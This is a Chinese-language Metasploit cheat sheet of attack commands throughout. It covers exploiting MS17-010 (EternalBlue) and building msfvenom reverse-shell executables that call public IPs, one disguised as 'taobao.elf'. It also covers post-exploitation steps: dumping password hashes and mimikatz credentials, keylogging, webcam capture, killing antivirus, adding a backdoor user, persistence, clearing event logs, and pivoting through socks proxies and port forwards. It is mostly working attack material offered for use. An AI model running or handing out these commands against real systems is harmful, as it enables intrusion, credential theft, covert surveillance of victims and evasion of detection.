![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611332155040-dfca6619-7b6a-451d-ab4f-c4e48841d93c.png#align=left&display=inline&height=485&originHeight=647&originWidth=1072&size=277244&status=done&style=none&width=804)
<a name="iURLj"></a>
## 常规操作
进入框架：msfconsole<br />使用search命令查找相关漏洞： search  ms17-010<br />使用use进入模块:  use exploit/windows/smb/ms17_010_eternalblue   <br />使用info查看模块信息： info <br />设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp<br />查看模块需要配置的参数：show options<br />设置参数：set  RHOST  192.168.125.138<br />攻击：exploit /  run <br /> 
<a name="24Sya"></a>
## 打exp时候设置的正反向连接
windows/x64/meterpreter/bind_tcp       #正向连接<br />windows/ x64/meterpreter/reverse_tcp    #反向连接，常用<br />windows/ x64/meterpreter/reverse_http   #通过监听80端口反向连接<br />windows/ x64/meterpreter/reverse_https  #通过监听443端口反向连接<br /> 
<a name="xIhJ6"></a>
## Auxiliary和Exploit模块
我的理解就是poc，运行之后有+号，证明存在漏洞<br />可以设置一个段来进行测试  例如输入：set  RHOSTS  192.168.125.125-129.168.125.140

我们要想从 meterpreter 退出到MSF框架，输入：background<br />输入： sessions  -l       查看我们获得的shell，前面有id<br />输入： sessions  -i  1     即可切换到id为1的shell<br />输入:  shell             即可进入到window的cmd
<a name="jrXzl"></a>
## Metreper的shell操作
sysinfo             #查看目标主机系统信息<br />run scraper         #查看目标主机详细信息<br />run hashdump        #导出密码的哈希<br />load kiwi           #加载mimikatz<br />ps                  #查看目标主机进程信息<br />pwd                 #查看目标当前目录(windows)<br />getlwd              #查看目标当前目录(Linux)<br />search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br />download  e:\test.txt /root          #将目标机的e:\test.txt文件下载到/root目录下<br />upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下<br />getpid              #查看当前Meterpreter Shell的进程PID<br />migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br />idletime            #查看主机运行时间<br />getuid              #查看获取的当前权限<br />getsystem           #提权,获得的当前用户是administrator才能成功<br />run  killav         #关闭杀毒软件<br />screenshot          #截图<br />webcam_list         #查看目标主机的摄像头<br />webcam_snap         #拍照<br />webcam_stream       #开视频<br />execute  参数  -f 可执行文件   #执行可执行程序<br />run getgui -u hack -p 123    #创建hack用户，密码为123<br />run getgui -e                #开启远程桌面<br />keyscan_start                #开启键盘记录功能<br />keyscan_dump                 #显示捕捉到的键盘记录信息<br />keyscan_stop                 #停止键盘记录功能<br />uictl  disable  keyboard     #禁止目标使用键盘<br />uictl  enable   keyboard     #允许目标使用键盘<br />uictl  disable  mouse        #禁止目标使用鼠标<br />uictl  enable   mouse        #允许目标使用鼠标<br />load                         #使用扩展库<br />run                                    #使用扩展库<br /> <br />run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀<br />portfwd add -l 3389 -r 192.168.11.13 -p 3389    #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址<br />clearev                       #清除日志<br />进行迁移 migrate <br />
<a name="RVwc3"></a>
## msf制作反弹木马
_python_ -m SimpleHTTPServer 8080<br /> <br /> 在生成payload时可直接使用如下命令，生成的payload会直接注入到指定进程中。<br />msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2LPORT=3333 -e x86/shikata_ga_nai -b "\x00" -i 5-a x86 --platform win PrependMigrate=truePrependMigrateProc=svchost.exe -f exe -o shell.exe<br /> <br />msfvenom -p windows/meterpreter/reverse_tcp lhost= 47.115.37.135 lport=1234 -f exe -o test.exe  （windows）<br />msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=49.235.50.54 lport=8800 -f elf >taobao.elf  （linux）<br /> <br />msfvenom -p windows/meterpreter/reverse_tcp lhost=101.36.104.49 lport=8800 -f c<br /> <br />正向shell  shell_bind_tcp<br />然后msf使用exploit/multi/handler模块设置监听<br />msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp<br /> <br /> 
<a name="4eK0e"></a>
## Msf的socks5代理
首先要获得内网网段meterpreter > run get_local_subnets<br /> 一、meterpreter > run autoroute -s 172.17.0.0/24 添加路由<br />run autoroute -p 打印路由<br />二、 退出meterpreter之后route add 172.17.0.0 255.255.255.0 1<br />                          route add 0.0.0.0/24 1添加任意路由<br /> <br />-----------------------------这个时候MSF已经可以进行内网探测了---------------<br />search socks 查找代理<br />#使用socks5代理<br />use auxiliary/server/socks5<br />set SRVHOST 0.0.0.0<br />set SRVPORT 1080<br />set USERNAME root<br />set PASSWORD Password@<br />run<br />kali中修改/etc/proxychains.conf

然后执行命令前加上 proxychains命令<br />#然后就可以使用其他命令了，比如nmap<br />proxychains4 nmap -p 1-10000 -Pn -sT x.x.x.x     #在打开其他程序前加上proxychains<br /> 
<a name="brseO"></a>
## msf抓mimikatz密码
meterpreter > load mimikatz<br />meterpreter > mimikatz_command -f samdump::hashes<br />meterpreter > mimikatz_command -f sekurlsa::searchPasswords
<a name="KreBc"></a>
## Post 后渗透模块
run post/windows/manage/migrate           #自动进程迁移<br />run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上<br />run post/windows/manage/killav            #关闭杀毒软件<br />run post/windows/manage/enable_rdp        #开启远程桌面服务<br />run post/windows/manage/autoroute         #查看路由信息<br />run post/windows/gather/enum_logged_on_users   #列举当前登录的用户<br />run post/windows/gather/enum_applications       #列举应用程序<br />run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码<br />run post/windows/gather/smart_hashdump               #dump出所有用户的hash<br />run post/multi/recon/local_exploit_suggester       如果是获取shell后权限是比较低的，post模块中有一个检测目标系统补丁然后会给出相应exp提权的功能<br /> 

 
<a name="q8M9L"></a>
## Msf端口转发
meterpreter > portfwd add –l 3389 –p 3389 –r [目标内网ip地址]<br /> -p也是目标机器的端口<br />  -l才是本地端口<br /> <br />meterpreter > portfwd delete –l 3389 –p 3389 –r 172.16.194.191<br /> <br />portfwd list<br /> <br /> <br />msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0
